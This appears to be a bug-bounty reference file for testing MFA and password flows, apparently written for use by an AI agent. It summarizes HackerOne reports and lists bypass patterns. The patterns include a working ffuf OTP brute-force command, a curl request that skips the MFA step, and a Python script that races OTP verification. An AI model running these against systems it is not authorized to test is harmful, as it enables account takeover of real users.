# MFA And Passwords — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Test OTP brute force limits, reuse, expiry, and response leakage.

- Try MFA bypass via direct navigation, API calls, and remember-me tokens.

- Check backup-code generation and storage.

- Test password reset/change for missing current-password checks.



## Bypass tricks



- Bypass step-up auth by replaying a privileged session.

- Use unicode/whitespace variants of the password.



## Deeper checklist



- Test OTP brute force limits, reuse, expiry, and response leakage.

- Try MFA bypass by direct navigation, API calls, and remember-me tokens.

- Check backup-code generation and storage.

- Test password reset and change flows for missing current-password checks.

- Look for user enumeration via timing and error messages.

- Prove bypass into a protected account or area.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Improper Authentication - any user can login as other user with otp/logout & otp/login** — `#921780` · Snapchat · $0 · ▲972

  > - Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.

- **Change phone number OTP flaw leads to any phone number takeover** — `#2588329` · inDrive · $2,000 · ▲241

  > When an user requests a phone number change inside the app, it will send a 4 digit code but if you place 0000, it will accept any number and update it into the app!!

- **Hacker can bypass 2FA requirement and reporter blacklist through embedded submission form** — `#418767` · HackerOne · $10,000 · ▲208

  > BYPASS: Get the `Embedded Submission` URL on their [policy page](https://hackerone.com/parrot sec): i get this - https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded submissions/new

- **2FA Bypass leads to  impersonation of legimate users** — `#2885636` · Drugs.com · $0 · ▲207

  > Go to https://www.drugs.com/account/register/ and create an account using an email you own.

- **TikTok 2FA Bypass** — `#1247108` · TikTok · $1,564 · ▲194

  > A vulnerability was found where a user would be able to bypass 2FA if logging in and redirecting back on a UK TikTok Seller URL.

- **Previously created sessions continue being valid after MFA activation** — `#667739` · Superhuman (formerly Grammarly) · $0 · ▲176

  > I found one issue related to your 2FA system on https://account.grammarly.com/security

- **Web Authentication Endpoint Credentials Brute-Force Vulnerability** — `#127844` · HackerOne · $0 · ▲161

  > The following successful brute-force attack of 10.001 passwords (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k most common.txt appended with the real password) against test account ██████:Geniaal2!!

- **Enable 2FA without verifying the email** — `#649533` · Moneybird · $0 · ▲149

  > Attacker sign up with victim email (Email verification will be sent to victim email).

- **Bypassing HackerOne 2FA due to race condition** — `#2598548` · HackerOne · $0 · ▲139

  > When a user canceled one reset request, the remaining requests would stay active, potentially leading to unauthorized 2FA removal after 24 hours.

- **Business Logic Error – Bypass of OTP Verification During Signup on hover.com** — `#3255473` · Tucows (VDP) · $0 · ▲135

  > By omitting the code parameter entirely from the signup request, the backend completes the registration and returns a valid session.

- **Yet Another OTP code Leaked in the API Response** — `#2635315` · MTN Group · $0 · ▲135

  > This is much similar to my report here(https://hackerone.com/reports/2633888) , except it affects a different domain.

- **Adding phone number to profile By OTP brute forcing** — `#3265780` · CoinMate.io · $100 · ▲114

  > Step2: So enter any OTP in the OTP filed and intercept the request in the burp-suite, Then send the intercepted request to burp intruder.

- **Claiming the listing of a non-delivery restaurant through OTP manipulation** — `#1330529` · Eternal · $3,250 · ▲108

  > Here by changing the `verificationCode` - (Otp received on Attacker Mobile in response of Request :1 )& `requestId` (Response of request:1) and `resId` to Victim Restaurant.

- **2FA requirement bypass when inviting team members** — `#3356149` · Omise · $0 · ▲105

  > Use a Burp extension ( Match and Replace) to change the client-side flag `false → true`.

- **Bypass a fix for report #708013** — `#1363672` · Shopify · $3,500 · ▲102

  > Observe that you have bypassed the limit though the email is still valid (to prove it try `{email: \"█████ \", password: \"███\" }` and get the token)

- **Email OTP/2FA Bypass** — `#2315420` · Drugs.com · $0 · ▲100

  > The application has a functionality of 2FA by email OTP so i can bypass that 2FA and got the access of application without having any access of victim account.

- **2FA bypass possible on https://authsvc.singlestore.com** — `#3329361` · SingleStore · $0 · ▲96

  > CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/CR:H/IR:H/AR:H

- **Password not checked when disabling 2FA on HackerOne** — `#587910` · HackerOne · $0 · ▲95

  > when I was submitted a report to a program that request `2FA` ON, I notice that if you try to disable this option will ask for `backup code - password` and if you enter a random password in the request filed and a correct `backup code` it will be successfully…

- **Improper Authentication Throttling Allows Attacker-Controlled Account Lockouts** — `#3160210` · Lichess · $0 · ▲92

  > Because the system does not verify the request origin or impose intelligent rate-limiting tied to session/IP/fingerprint, an attacker can intentionally lock out legitimate users — impacting their access to the application.

- **Account takeover w/o interaction for a user that doesn't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify** — `#810880` · Helium · $0 · ▲92

  > Register an account `user2`, register at https://console.helium.com, perform a 2FA request but with ID from `user1`.

- **Session Doesn't expire after 2fa and also other session can change passsword** — `#2234736` · SideFX · $300 · ▲90

  > I found one issue related to your 2FA system on https://sidefx.com

- **“email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired** — `#665722` · Superhuman (formerly Grammarly) · $2,500 · ▲82

  > When we turn on the MFA and we have the user and password of the user, it is possible bypass the MFA only changing some values the endpoint POST `auth.grammarly.com//v3/api/login`

- **OTP code Leaked in API Response** — `#2633888` · MTN Group · $0 · ▲81

  > The application https://corporate.admyntec.co.za allows users to sign up for device insurance.

- **Information disclosure -> 2fa bypass -> POST exploitation** — `#1276373` · Algolia · $0 · ▲76

  > - There will be 2 buttons : "Revoke" and "Renew", click on "Renew" and intercept that request using proxy like burp suite

- **Weak Rate Limiting Controls in the (LOGIN) page Expose System to Brute Force and DoS Attacks** — `#3085889` · Lichess · $0 · ▲74

  > =================================================================================

- **Able to blocking users with 2fa from login into their accounts by just knowing the SteamID** — `#1179232` · CS Money · $300 · ▲70

  > By changing the steamID cookie on confirm 2fa code request, I am able to block the login of an account with 2fa for 5 minutes (300 seconds).

- **Enable 2FA without verifying the email** — `#3016540` · XVIDEOS · $0 · ▲70

  > After that, Navigate to: https://www.xvideos.com/account/security

- **Bypassing the victim's phone number OTP in the account recovery process on the https://hackerone.com/settings/auth/setup_account_recovery** — `#2501984` · HackerOne · $0 · ▲67

  > First, create an account recovery request using your own phone number and successfully enable account recovery with that same number.

- **Two-factor authentication enforcement bypass** — `#1050244` · Nextcloud · $750 · ▲64

  > https://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php

- **Brute Force of fabric-ca server admin account** — `#411364` · Linux Foundation Decentralized Trust · $0 · ▲61

  > - Listening 0.0.0.0:7054(easily discoved and can be reached)



## Case studies



### Improper Authentication - any user can login as other user with otp/logout & otp/login

`#921780` · Snapchat · $0 · critical · 2021-09-03 · ▲972

> '/scauth/otp/droid/logout' request contains user id parameter. Usually it is equal to current user user id, but if an attacker passes user id of victim account he can login as victim. I will demonstrate the problem on two accounts. Victim: ███ Attacker: ██████████ - Attacker perform a usuall login to attacker's personal account.



### Bruteforce password recovery code

`#743545` · Bumble · $0 · n/a · 2020-01-18 · ▲258

> It's possible to bruteforce recovery code from SMS as iOS application doesn't have limits for incorrect inputs. I have tried 50+ different combinations until I reached code from SMS.



### Change phone number OTP flaw leads to any phone number takeover

`#2588329` · inDrive · $2,000 · critical · 2024-10-09 · ▲241

> Dear Indrive, Ive found another valid report, the app allows any user to change the app phone number, but a flaw within the otp allows any number to be added into the account! When an user requests a phone number change inside the app, it will send a 4 digit code but if you place 0000, it will accept any number and update it into the app!!



### Hacker can bypass 2FA requirement and reporter blacklist through embedded submission form

`#418767` · HackerOne · $10,000 · medium · 2018-10-31 · ▲208

> A program owner can enforce the hackers to setup the two-factor authentication before submitting new reports to their program here: https://hackerone.com/parrot sec/submission requirements (see below image) {F355169} The Parrot Sec program has this feature enabled to enforce the hackers to setup 2FA before submitting reports. I removed my 2FA to test and it is good that i was block from submitting new reports (see below image) {F355168} ---



### 2FA Bypass leads to  impersonation of legimate users

`#2885636` · Drugs.com · $0 · high · 2025-03-14 · ▲207

> Hello team, I have discovered a logic flaw in the authentication system that allows an attacker (User A) to impersonate a legitimate user (User B) who has not yet registered. By abusing the email change functionality and bypassing 2FA, the attacker can retain access to the account until the legitimate user resets their password.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class mfa-and-passwords --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class mfa-and-passwords

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class mfa-and-passwords

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class mfa-and-passwords --min-bounty 1000

```



## 19. MFA / 2FA BYPASS

> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.



### Pattern 1: No Rate Limit on OTP

```bash

# Test with ffuf — all 1M 6-digit codes

ffuf -u "https://target.com/api/verify-otp" \

  -X POST -H "Content-Type: application/json" \

  -H "Cookie: session=YOUR_SESSION" \

  -d '{"otp":"FUZZ"}' \

  -w <(seq -w 000000 999999) \

  -fc 400,429 -t 5

# -t 5 (slow down) — aggressive rates get 429 or ban

```



### Pattern 2: OTP Not Invalidated After Use

```

1. Login → receive OTP "123456" → enter it → success

2. Logout → login again with same credentials

3. Try OTP "123456" again

4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)

```



### Pattern 3: Response Manipulation

```

1. Enter wrong OTP → capture response in Burp

2. Change {"success":false} → {"success":true} (or 401 → 200)

3. Forward → if app proceeds → client-side only MFA check

```



### Pattern 4: Skip MFA Step (Workflow Bypass)

```bash

# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa

# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie

# If app grants access without MFA = auth flow bypass = Critical

curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard

```



### Pattern 5: Race on MFA Verification

```python

import asyncio, aiohttp



async def verify(session, otp):

    async with session.post("https://target.com/api/mfa/verify",

                            json={"otp": otp}) as r:

        return r.status, await r.text()



async def race():

    cookies = {"session": "YOUR_SESSION"}

    async with aiohttp.ClientSession(cookies=cookies) as s:

        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU

        # window before the server marks it used. Two requests are NOT enough —

        # they almost always resolve sequentially as "already-used" (false negative).

        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).

        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])

        # Race confirmed if >1 success (or 1 success among many "already-used").

        for status, body in results:

            print(status, body)

asyncio.run(race())

```



### Pattern 6: Backup Code Brute Force

```

Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)

BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit

Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.

```



### Pattern 7: "Remember This Device" Trust Escalation

```

1. Complete MFA once on Device A (attacker's browser)

2. Capture the "remember device" cookie

3. Present that cookie from a new IP/browser

4. If MFA skipped = device trust not bound to IP/UA = ATO from any location

```



### MFA Chain Escalation

```

Rate limit bypass + no lockout = ATO (Critical)

Response manipulation = client-side only check = Critical

Skip MFA step = auth flow bypass = Critical

OTP reuse = persistent session hijack = High

```



---
